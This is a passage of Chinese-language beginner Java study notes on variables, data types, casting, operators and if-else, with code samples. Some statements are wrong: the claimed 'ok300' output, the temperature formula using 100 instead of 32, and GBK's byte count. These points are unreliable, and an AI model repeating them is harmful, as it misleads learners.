class="hljs-built_in">del</span><br>输出内容到文件：<span class="hljs-built_in">echo</span><br>剪切：<span class="hljs-built_in">move</span><br></code></pre></td></tr></table></figure><h1 id="章节二"><a href="#章节二" class="headerlink" title="章节二"></a>章节二</h1><h2 id="1-变量"><a href="#1-变量" class="headerlink" title="1.变量"></a>1.变量</h2><p>变量是程序的基本组成单位，相当于内存中一个数据存储空间的表示。</p><p><strong>变量有三个基本要素（类型+名称+值）</strong></p><p>基本步骤：</p><p>1）声明变量：int a</p><p>2）赋值：a&#x3D;60</p><p>3）使用 :System.out.println(a)</p><p><strong>注意事项</strong></p><p>1.变量表示内存中的一个存储区域</p><p>2.该区域有自己的名称[变量名]和类型[数据类型]</p><p>3.变量必须先声明，后使用</p><p>4.该区域的数据&#x2F;值可以在同一类型范围内不断变化</p><p>5.变量在同一个作用域内不能重名</p><p>6.变量&#x3D;变量名+值+数据类型</p><h2 id="2-加号的使用"><a href="#2-加号的使用" class="headerlink" title="2.加号的使用"></a>2.加号的使用</h2><p>1）左右两边都是数值时，做加法运算</p><p>2）左右两边有一方为字符串，做拼接运算</p><h2 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3.数据类型"></a>3.数据类型</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%885.30.34.png" alt="截屏2022-04-10 下午5.30.34"></p><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><p>浮点数意味着小数点（point）可在数字中移动（float）。</p><p>625.9可以写成，0.6259x10^3。.6259是有效数字（尾数），3是指数。</p><p>在32位浮点数中，第一位作为符号位，8位存指数，剩下23位存有效数字。</p><p>计算例子：</p><blockquote><p>10进制数20.59375，转换为IEEE754标准的32位浮点数的二进制存储格式。</p><p>（20.59375）10&#x3D;（10100.10011）2</p><p>&#x3D; 10100.10011 x 2^0</p><p>&#x3D;<strong>1</strong>.010010011 x 2^4</p><p>4+127 &#x3D; 131 &#x3D; 1000 0011 （指数）</p><p>存储格式：</p><p>0 1000 0011 0100 1001 ….. 0</p></blockquote><p>ps：关于4+127，32位浮点数偏置常数127，所以加127。</p><p>1）浮点数在机器中的存放形式：浮点数&#x3D;符号位+指数位+尾数位</p><p><img src="https://img-blog.csdnimg.cn/20190825152240237.png" alt="在这里插入图片描述"></p><p>默认浮点数为double，声明float型需要后面加‘f’或‘F’。</p><p>3）可以省略0（例如.123，输出为0.123）。</p><p>4）科学计数法：5.12e2（5.12*10的2次方）。</p><p>5）浮点数除法需要注意，例如2.7和8.1&#x2F;3结果不同。8.1&#x2F;3是一个接近2.7的小数。</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>1）单引号括起来的单个字符</p><p>2）char的本质是一个整数，在输出是，是Unicode码对应的字符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span>;<br>System.out.println(c1);<br>System.out.println((<span class="hljs-type">int</span>)c1);<br></code></pre></td></tr></table></figure><p>输出为a和97.</p><p>3）char类型可以运算</p><h3 id="常用编码"><a href="#常用编码" class="headerlink" title="常用编码"></a>常用编码</h3><p>1）ascii（一个字节表示，一共128个字符）</p><p>2）unicode（字母和汉字统一占用两个字节，世界上所有的符号都纳入其中）</p><p>3）utf-8（大小可变的编码，字母一个字节，汉字三个字节。【使用最广的一种Unicode的实现方式】）</p><p>4）gbk（字母使用1个字节，汉字3个字节）</p><p>5）gb2312（可以表示汉字，gb2313&lt;gbk)</p><p>6）big5码（繁体中文）</p><h3 id="布尔类型boolean"><a href="#布尔类型boolean" class="headerlink" title="布尔类型boolean"></a>布尔类型boolean</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>  <span class="hljs-type">boolean</span> <span class="hljs-variable">isPass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">if</span>(isPass == <span class="hljs-literal">true</span>)&#123;<br>    System.out.println(<span class="hljs-string">&quot;考试通过！&quot;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;考试不通过。&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出考试通过！</p><ul><li>java中不可以用0或者非0的数字代替false或true</li></ul><h2 id="4-自动类型转换"><a href="#4-自动类型转换" class="headerlink" title="4.自动类型转换"></a>4.自动类型转换</h2><p>低精度的<strong>可以</strong>转换成高精度的。</p><p>高精度的<strong>不可以</strong>转换成低精度的。</p><p>转换表：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-04-12%20%E4%B8%8B%E5%8D%8812.03.38.png" alt="截屏2022-04-12 下午12.03.38"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">float</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span> + <span class="hljs-number">1.1</span>;<br>  <span class="hljs-comment">//错误，1.1为double。以下两种正确</span><br>  <span class="hljs-comment">//float d1 = 10 + 1.1F</span><br>  <span class="hljs-comment">//double d1 = 10 + 1.1</span><br><span class="hljs-type">byte</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-type">byte</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> n2; <span class="hljs-comment">//错误，原因：1确实等于byte的10，但n2的类型为int，占用4个字节，而byte只占用一个。</span><br><span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> b2; <span class="hljs-comment">//错误，char不能自动转成byte，反之亦然</span><br><br></code></pre></td></tr></table></figure><p>byte、short、char三者可以进行运算，但是运算前需要转换成int类型。</p><p>boolean不参与自动类型的转换。</p><p><strong>自动提升原则</strong>：表达式结果的类型<strong>自动提升</strong>为操作中<strong>最大的类型</strong>。</p><h2 id="5-强制类型转换"><a href="#5-强制类型转换" class="headerlink" title="5.强制类型转换"></a>5.强制类型转换</h2><p>将容量大的数据类型转换为容量小的数据类型，使用时要加上强制转换符()。</p><p>可能会造成精度降低或溢出，需要特别注意。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)<span class="hljs-number">1.9</span>; <span class="hljs-comment">//n1为1，造成精度损失</span><br><br><span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> <span class="hljs-number">2000</span>;<br><span class="hljs-type">byte</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> (<span class="hljs-type">byte</span>)n2;<span class="hljs-comment">//b1为-48，数据溢出</span><br></code></pre></td></tr></table></figure><details> <summary>*关于2000溢出为什么是-48</summary>      <br>2000的二进制形式为0000 0111 1101 0000.  <br>byte只有一个字节，所以只留下1101 0000.  <br>第一位为1，被认为是负数。负数以补码的方式存储，所以通过取反加一换算，结果为1011 0000（也就是-48）<p>1）强转符号只针对于最近的操作数有效，往往会使用小括号提升优先级</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)<span class="hljs-number">10</span>*<span class="hljs-number">3.5</span>+<span class="hljs-number">6</span>*<span class="hljs-number">1.5</span>; <span class="hljs-comment">//错误</span><br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(<span class="hljs-number">10</span>*<span class="hljs-number">3.5</span>+<span class="hljs-number">6</span>*<span class="hljs-number">1.5</span>); <span class="hljs-comment">//正确</span><br></code></pre></td></tr></table></figure><p>2）char可以保存int的常量值，但不能保存int的变量值。需要强转。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>; <span class="hljs-comment">//ok</span><br><span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>; <span class="hljs-comment">//ok</span><br><span class="hljs-comment">//char c2 = m; //错误</span><br><span class="hljs-type">char</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>)m; <span class="hljs-comment">//ok</span><br>System.out.println(c3); <span class="hljs-comment">//输出100对应的字符。</span><br></code></pre></td></tr></table></figure><h2 id="6-基本数据类型和string类型的转换"><a href="#6-基本数据类型和string类型的转换" class="headerlink" title="6.基本数据类型和string类型的转换"></a>6.基本数据类型和string类型的转换</h2><p><strong>方法1：将基本类型的值+””</strong></p><p><strong>方法2：通过基本类型的包装类调用parseXX方法即可</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>  <span class="hljs-comment">//基本数据类型 -》string</span><br>  <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br>  <span class="hljs-type">float</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1.1F</span>;<br>  <span class="hljs-type">double</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> <span class="hljs-number">4.5</span>;<br>  <span class="hljs-type">boolean</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> n1 + <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> f1 + <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">s3</span> <span class="hljs-operator">=</span> f1 + <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">s4</span> <span class="hljs-operator">=</span> f1 + <span class="hljs-string">&quot;&quot;</span>;<br>  System.out.println(s1 + <span class="hljs-string">&quot;&quot;</span> + s2 + <span class="hljs-string">&quot;&quot;</span> + s3 + <span class="hljs-string">&quot;&quot;</span> + s4 + b1 ); <span class="hljs-comment">//输出1001.11.11.1.true</span><br><br>  <span class="hljs-comment">//String -》 对应的基本数据类型</span><br>  <span class="hljs-comment">//使用基本数据类型对应的包装类 的相应方法，得到基本数据类型</span><br>  <span class="hljs-type">String</span> <span class="hljs-variable">s5</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123&quot;</span>;<br>  <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> Integer.parseInt(s5);<br>  <span class="hljs-type">double</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> Double.parseDouble(s5);<br>  <span class="hljs-type">float</span> <span class="hljs-variable">num3</span> <span class="hljs-operator">=</span> Float.parseFloat(s5);<br>  <span class="hljs-type">long</span> <span class="hljs-variable">num4</span> <span class="hljs-operator">=</span> Long.parseLong(s5);<br>  <span class="hljs-type">byte</span> <span class="hljs-variable">num5</span> <span class="hljs-operator">=</span> Byte.parseByte(s5);<br>  <span class="hljs-type">boolean</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> Boolean.parseBoolean(<span class="hljs-string">&quot;true&quot;</span>);<br>  <span class="hljs-type">short</span> <span class="hljs-variable">num6</span> <span class="hljs-operator">=</span> Short.parseShort(s5);<br>  System.out.println(num1); <span class="hljs-comment">//123</span><br>  System.out.println(num2); <span class="hljs-comment">//123.0</span><br>  System.out.println(num3); <span class="hljs-comment">//123.0</span><br>  System.out.println(num4); <span class="hljs-comment">//123</span><br>  System.out.println(num5); <span class="hljs-comment">//123</span><br>  System.out.println(num6); <span class="hljs-comment">//123</span><br>  System.out.println(b); <span class="hljs-comment">//true </span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>方法3：字符串转换为char，意思是得到字符串的第一个字符。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s5</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123&quot;</span>;<br>System.out.println(s5.charAt(<span class="hljs-number">0</span>)); <span class="hljs-comment">//输出1</span><br></code></pre></td></tr></table></figure><h1 id="章节三"><a href="#章节三" class="headerlink" title="章节三"></a>章节三</h1><p>运算符：一种特殊的符号，用以表示数据的运算、赋值和比较等。</p><h2 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1.算术运算符"></a>1.算术运算符</h2><p><strong>+、-、*、&#x2F;、%、++、–</strong></p><p>两个题目：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//1.还有59天放假，问：合xx个星期零xx天</span><br><span class="hljs-type">int</span> <span class="hljs-variable">days</span> <span class="hljs-operator">=</span> <span class="hljs-number">59</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">week</span> <span class="hljs-operator">=</span> days/<span class="hljs-number">7</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">day</span> <span class="hljs-operator">=</span> days%<span class="hljs-number">7</span>;<br>System.out.println(<span class="hljs-string">&quot;合&quot;</span>+week+<span class="hljs-string">&quot;个星期零&quot;</span>+day+<span class="hljs-string">&quot;天&quot;</span>);<br><br><span class="hljs-comment">//2.定义一个变量保存华氏温度，华氏温度转换摄氏温度的公式为：5/9*(华氏温度-100)，求出华氏温度对应的摄氏温度【234.5】</span><br><span class="hljs-type">double</span> <span class="hljs-variable">Fahrenheit</span> <span class="hljs-operator">=</span> <span class="hljs-number">234.5</span>;<br><span class="hljs-type">double</span> <span class="hljs-variable">Centigrade</span> <span class="hljs-operator">=</span> <span class="hljs-number">5.0</span> / <span class="hljs-number">9</span> * (Fahrenheit-<span class="hljs-number">100</span>);<br>System.out.println(<span class="hljs-string">&quot;华氏温度&quot;</span>+Fahrenheit+<span class="hljs-string">&quot;对应的摄氏温度为&quot;</span>+Centigrade);<br><br><br>-<span class="hljs-number">10.5</span>%<span class="hljs-number">3</span> = -<span class="hljs-number">1.5</span>;<br><span class="hljs-comment">//-10.5%3 = -10.5 - (-10)/3 *3 = -10.5 +9 = -1.5</span><br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">66</span>;<br>System.out.println(++i+i);<br><span class="hljs-comment">//执行 i=i+1 =&gt; i=67 =&gt;134</span><br></code></pre></td></tr></table></figure><p><strong>取模：</strong></p><p><strong>a%b，当a是小数时，公式&#x3D;a-(int)a&#x2F;b*b</strong></p><h2 id="2-关系运算符"><a href="#2-关系运算符" class="headerlink" title="2.关系运算符"></a>2.关系运算符</h2><p><strong>&#x3D;&#x3D;、!&#x3D;、&lt;、&gt;、&lt;&#x3D;、&gt;&#x3D;、instanceof（检测是否是类的对象）</strong></p><p>例子：”hsp” instanceof String   &#x3D;&#x3D;》 true</p><h2 id="3-逻辑运算符"><a href="#3-逻辑运算符" class="headerlink" title="3.逻辑运算符"></a>3.逻辑运算符</h2><p>用于连接多个条件，结果也是Boolean。</p><p>1）短路与&amp;&amp;、短路或||，取反!</p><p>2）逻辑与&amp;、逻辑或|、逻辑异或^</p><p><strong>&amp;&amp;和&amp;的区别：&amp;&amp;的第一个条件为false后不会判断第二个条件，效率更高。&amp;会判断第二个条件。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">4</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">9</span>;<br><span class="hljs-keyword">if</span> (a&lt;<span class="hljs-number">1</span> &amp;&amp; ++b &lt;<span class="hljs-number">50</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;ok300&quot;</span>);<br>&#125; <br>System.out.println(<span class="hljs-string">&quot;a=&quot;</span>+a+<span class="hljs-string">&quot; b=&quot;</span>+b); <br><span class="hljs-comment">//ok300</span><br><span class="hljs-comment">//a=4 b=9</span><br></code></pre></td></tr></table></figure><p><strong>||和|的区别：||的第一个条件为ture则不会判断第二个条件。效率高。</strong></p><h2 id="4-赋值运算符"><a href="#4-赋值运算符" class="headerlink" title="4.赋值运算符"></a>4.赋值运算符</h2><p>基本赋值运算符：&#x3D;</p><p>复合赋值运算符：+&#x3D;、-&#x3D;、*&#x3D;、&#x2F;&#x3D;、%&#x3D;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br>b+=<span class="hljs-number">2</span>; <span class="hljs-comment">//等价于 b=(byte)(b+2);</span><br>b++; <span class="hljs-comment">// b = (byte)(b+1)</span><br></code></pre></td></tr></table></figure><h2 id="5-三元运算符"><a href="#5-三元运算符" class="headerlink" title="5.三元运算符"></a>5.三元运算符</h2><p><strong>条件表达式?表达式1:表达式2;</strong></p><p>为true返回表达式1，为false返回表达式2.</p><p>表达式1和表达式2要为可以赋给接受变量的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a &gt; b ? a : b;<br><span class="hljs-comment">//int d = a &gt; b ? 1.1 : 3.4 //错误，double不可直接转为int</span><br><span class="hljs-type">int</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> a &gt; b ? (<span class="hljs-type">int</span>)<span class="hljs-number">1.1</span> : (<span class="hljs-type">int</span>)<span class="hljs-number">3.4</span>; <br><span class="hljs-type">double</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> a &gt; b ? a : b + <span class="hljs-number">3</span>; <span class="hljs-comment">//可以</span><br></code></pre></td></tr></table></figure><p><strong>案例：判断3个数的最大值。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">553</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> <span class="hljs-number">33</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">n3</span> <span class="hljs-operator">=</span> <span class="hljs-number">123</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-variable">max1</span> <span class="hljs-operator">=</span> n1 &gt; n2 ? n1 : n2;<br><span class="hljs-type">int</span> <span class="hljs-variable">max2</span> <span class="hljs-operator">=</span> max1 &gt; n3 ? max1 : n3;<br><span class="hljs-comment">//一句话语句实现</span><br><span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> (n1 &gt; n2 ? n1 : n2) &gt; n3 ? (n1 &gt; n2 ? n1 :n2) : n3;<br></code></pre></td></tr></table></figure><h2 id="6-运算符优先级"><a href="#6-运算符优先级" class="headerlink" title="6.运算符优先级"></a>6.运算符优先级</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-04-18%20%E4%B8%8B%E5%8D%888.19.26.png" alt="截屏2022-04-18 下午8.19.26" style="zoom:50%;" /><h2 id="7-键盘输入"><a href="#7-键盘输入" class="headerlink" title="7.键盘输入"></a>7.键盘输入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner; <span class="hljs-comment">//表示把java.util下的scanner类导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">input</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//创建scanner对象</span><br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-comment">//接收用户输入</span><br>System.out.println(<span class="hljs-string">&quot;请输入名字&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> myScanner.next(); <span class="hljs-comment">//接收用户输入字符串</span><br>System.out.println(<span class="hljs-string">&quot;请输入年龄&quot;</span>);<br><span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> myScanner.nextInt(); <span class="hljs-comment">//接收用户输入int</span><br>System.out.println(<span class="hljs-string">&quot;请输入薪水&quot;</span>);<br><span class="hljs-type">double</span> <span class="hljs-variable">sal</span> <span class="hljs-operator">=</span> myScanner.nextDouble(); <span class="hljs-comment">//接收用户输入double</span><br>System.out.println(<span class="hljs-string">&quot;人的信息如下：&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;name=&quot;</span>+name+<span class="hljs-string">&quot; age=&quot;</span>+age+<span class="hljs-string">&quot; sal=&quot;</span>+sal);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-04-24%20%E4%B8%8B%E5%8D%886.04.00.png" alt="截屏2022-04-24 下午6.04.00"></p><h2 id="8-位运算"><a href="#8-位运算" class="headerlink" title="8.位运算"></a>8.位运算</h2><p><strong>与&amp;、或|、异或^、取反~</strong></p><p>负数的补码&#x3D;它的反码+1</p><p>负数的反码&#x3D;它的补码-1</p><p>**算术右移&gt;&gt;**：低位溢出，符号位不变，并用符号位补溢出的高位</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">2</span> ;<br><span class="hljs-comment">//1 =&gt; 000000 01 =&gt; 00000 00 本质1/2/2=0</span><br></code></pre></td></tr></table></figure><p>**算术左移&lt;&lt;**：符号位不变，低位补0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span>; <br><span class="hljs-comment">//1 =&gt; 00000 001 =&gt; 00000 100 本质 1*2*2 =4</span><br></code></pre></td></tr></table></figure><p>**逻辑右移&gt;&gt;&gt;**（无符号右移）：低位溢出，高位补0</p><p>例如：15&gt;&gt;2 ，运算过程为15&#x2F;2&#x2F;2，结果为3.</p><p>0000 1111 -&gt; 0000 0011</p><p>所以无小数点，int型向下取整。</p><h1 id="章节四"><a href="#章节四" class="headerlink" title="章节四"></a>章节四</h1><h2 id="1-单条件分支-if-else"><a href="#1-单条件分支-if-else" class="headerlink" title="1.单条件分支 if-else"></a>1.单条件分支 if-else</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(条件表达式)&#123;<br>执行代码块;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  执行代码块;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果执行代码块只有一条，可以不要大括号。</p><p><strong>三个练习</strong><br>1.编写程序，声明两个double型并赋值，判断第一个数大于10.0，且第二个数小于20.0，打印两数之和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>System.out.println(<span class="hljs-string">&quot;输入第一个数：&quot;</span>);<br><span class="hljs-type">double</span> <span class="hljs-variable">number1</span> <span class="hljs-operator">=</span> myScanner.nextDouble();<br>System.out.println(<span class="hljs-string">&quot;输入第二个数：&quot;</span>);<br><span class="hljs-type">double</span> <span class="hljs-variable">number2</span> <span class="hljs-operator">=</span> myScanner.nextDouble();<br>    <span class="hljs-comment">//判断</span><br><span class="hljs-keyword">if</span> (number1 &gt; <span class="hljs-number">10.0</span> &amp;&amp; number2 &lt; <span class="hljs-number">20.0</span>) &#123;<br>System.out.println(number1+number2);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.定义两个变量int，判断两数之和，是否能被3又能被5整除</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 